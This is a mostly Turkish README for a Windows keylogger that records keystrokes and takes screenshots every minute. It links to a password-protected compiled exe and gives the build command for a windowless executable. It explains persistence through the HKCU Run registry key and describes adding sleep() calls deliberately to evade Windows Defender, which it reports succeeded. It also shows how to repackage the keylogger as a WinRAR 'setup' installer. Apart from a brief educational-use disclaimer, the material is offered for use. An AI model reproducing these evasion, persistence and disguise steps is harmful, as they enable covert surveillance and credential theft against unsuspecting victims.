# Gngr_local_keylogger_for_windows
(On 06/04/2021) Local Keylogger software has been made for the latest up-to-date "Windows 7, 8 and 10" operatings systems. It managed to circumvent the "Windows Defender" program.


Windows 10 işletim sisteminde çalışan ve Defender gibi güvenlik programlarına yakalanmayan "Local keylogger" programı yazılması hedeflenmiştir. 06/04/2021 tarihi itibarıyla gerçekleştirilmiştir. Güncellemelerle beraber zamanla bu durum değişebilir.


Kaynak kodun derlenmiş hali (-Exe hali-) https://drive.google.com/file/d/1tvtZcLb_Sm-gQI8cXSjLKKNoXZlFxd2e/view?usp=sharing adresinde indirilebilir. İndirilen rar dosyasının şifresi "gngr-v1.0"  dir.

Kaynak kodun derlenmiş çalışır hali ile ilgili video https://www.youtube.com/watch?v=Zb03F4iYUzg adresinden izlenebilir.



Gereksinimler
---------------
Gerekli kütüphaneler: PyWin32, pynput, pyautogui, pyinstaller

Yüklemek için;

>> pip install PyWin32

>> pip install pyautogui

>> pip install pyinstaller

"pyinstaller" kodu tek parça çalıştırılabilir dosya haline getirmek için kullanılacak




Kaynak Kod
-------------
Keylogger kodlanırken "Python 3.8.5" kullanıldı. Program çalışırken; kendisini, log kayıtlarını ve ekran görüntülerini "%APPDATA%\Gngr-keylogger-v1.0\" klasörü altında tutmaktadır. Ayrıca kalıcı olmak için regedit "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" altında "Gngr_keylogger" adı altında "%APPDATA%\Gngr-keylogger-v1.0\keylogger.exe" anahtarı eklemektedir.

Birbirine ihtiyac duymayan 3 farklı dosyadan oluşmaktadır. İşlemler sırasında seçiminize göre üçünden herhangi birini kullanabilirsiniz. Bütün özelliklere sahip olan "keylogger.py" kullanmanız tavsiye edilir.

keylogger.py ==> Hem ekran görüntüsünü 1 dk arayla kaydederken hem de klavyedeki basılan tuşları kaydeder.

keyboard_log.py ==> Sadece klavyedeki basılan tuşları kaydeder.

screen_log.py  ==> Sadece ekran görüntüsünü kaydeder.




Önemli Notlar
---------------
"pynput" gibi hazır kütüphane kullanılmamıştır. Tarafımdan klavye fonksiyonu yazılmıştır. Klavye fonksiyonu, "Türkçe Q Klavye"ye göre yazılmıştır. Eğer herhangi
farklılık yaşamanız durumda ilgili klavye fonksiyonundan düzeltebilirsiniz. Detaylı bilgi için "https://docs.microsoft.com/tr-tr/dotnet/api/system.windows.forms.keys?view=net-5.0" adresine bakınız.

Kalıcılık için regedit girdisi kullanılmış olup, "wmic service" gibi daha agresif methodlar kullanılmamıştır. Farklı amaçlarla kullanılmaması için özellikle regedit kullanılmış olup, program "local keylogger" olacak şekilde dizayn edilmiştir.

Tespiti engellemek için "pynput" gibi çok kullanılan kütüphanelerden kaçınılmış olup, kaynak kodun içerisindeki "sleep()" kodları Defender'ı atlatmak için özellikle konulmuştur. Sonucu başarılı olmuştur. Bu sebepten "keylogger.py" kaynak kodu kullanılarak oluşturulan "exe" dosyalar, 4-5 dk sonra tam olarak çalışmaya başlar. Windows Defender sadece kaynak kodun imzasına bakmaz (sadece içerisinde zararlı kod aramaz), aynı zamanda davranışını da inceler. "sleep()"  kodları, Windows Defender programında kullanılan zararlı davranış kalıplarının atlatılmasını sağlar. 
 
![a1](https://user-images.githubusercontent.com/71177413/113765165-94714480-9724-11eb-9a44-7d8535f49036.JPG)




Kaynak Kodu Derlemek İçin
------------------------------
>> pyinstaller --onefile --noconsole --icon=keyboard.ico keylogger.py

Aşağıda PyCharm programı üzerinde nasıl derlendiği resim olarak gösterilmektedir.


[1] Derleme işlemi

![n1](https://user-images.githubusercontent.com/71177413/113765887-8112a900-9725-11eb-9f99-2e4dc61dcb1e.JPG)


[2 - Kaynak Kodun Derlenmiş Hali] Oluşturulan dist klasörü içerisinde kaynak kodun derlenmiş hali bulunur.

![n3](https://user-images.githubusercontent.com/71177413/113766053-ae5f5700-9725-11eb-9413-3b5b7af39eac.JPG)



"Winrar" Programı İle Keylogger Programını Setup Haline Getirme
------------------------------------------------------------------
İşlemler resim olarak,  aşağıda sıralı şekilde gösterilmiştir.

[1]

![n4](https://user-images.githubusercontent.com/71177413/113766398-0a29e000-9726-11eb-9962-4da6b54e2144.JPG)


[2]

![n5](https://user-images.githubusercontent.com/71177413/113766436-16ae3880-9726-11eb-8ed2-485f3d0556b6.JPG)


[3]

![n6](https://user-images.githubusercontent.com/71177413/113766475-2168cd80-9726-11eb-9713-0a1e2075565c.JPG)


[4]

![n7](https://user-images.githubusercontent.com/71177413/113766515-2fb6e980-9726-11eb-86cf-25cecfac2f8b.JPG)


[5]

![n8](https://user-images.githubusercontent.com/71177413/113766555-38a7bb00-9726-11eb-8715-0c87bc7f7ef8.JPG)


[6]

![n9](https://user-images.githubusercontent.com/71177413/113766611-48bf9a80-9726-11eb-8b81-db3277852bcf.JPG)


[7]

![n10](https://user-images.githubusercontent.com/71177413/113766638-51b06c00-9726-11eb-8026-8d52aa66abf8.JPG)


[8]

![n11](https://user-images.githubusercontent.com/71177413/113766717-6b51b380-9726-11eb-8ede-2ed93dc06ba3.JPG)


Keylogger Yazılımını, Sanal  ve Gerçek İşletim Sistemlerinde Deneme
---------------------------------------------------------------------------
Windows 7, 8 , 10 işletim sistemlerinde sorunsuz şekilde çalıştı. Özellikle tüm güncelleştirmeleri yapılmış işletim sistemleri seçildi. Ayrıca Defender ve Virüs tarama programı bulunan cihazlarda sorunsuz çalıştığı gözlemlendi.


[1]

![a2](https://user-images.githubusercontent.com/71177413/113767142-f9c63500-9726-11eb-88b3-217cc36041c3.JPG)


[2]

![a3](https://user-images.githubusercontent.com/71177413/113767226-19f5f400-9727-11eb-8b45-c456df106c52.JPG)


[3]

![a4](https://user-images.githubusercontent.com/71177413/113767257-24b08900-9727-11eb-98c9-b4ba6247ad1e.JPG)


[4]

![a5](https://user-images.githubusercontent.com/71177413/113767297-2f6b1e00-9727-11eb-956b-c51bf06f6df0.JPG)


Windows Defender İle Taratılma Sonucu
---------------------------------------
Programın çalışması sırasında herhangi bir uyarı ile karşılaşılmadı. İlgili programın konumu gösterilerek, özellikle güncel Windows Defender ile taratılmıştır. "06/04/2021" tarihi itibarıyla Defender programı herhangi bir uyarı vermemiştir. Güncellemelerle beraber zamanla bu durum değişebilir.


Yasal Uyarı
--------------
Eğitim amacıyla hazırlanmıştır.

Kullanıcıların bazı kullanım şekilleri suça sebep olabilir.

Olumsuz durumlarla karşılaşmamak için "Yasal_Uyarı.txt" dosyasını okuyunuz.
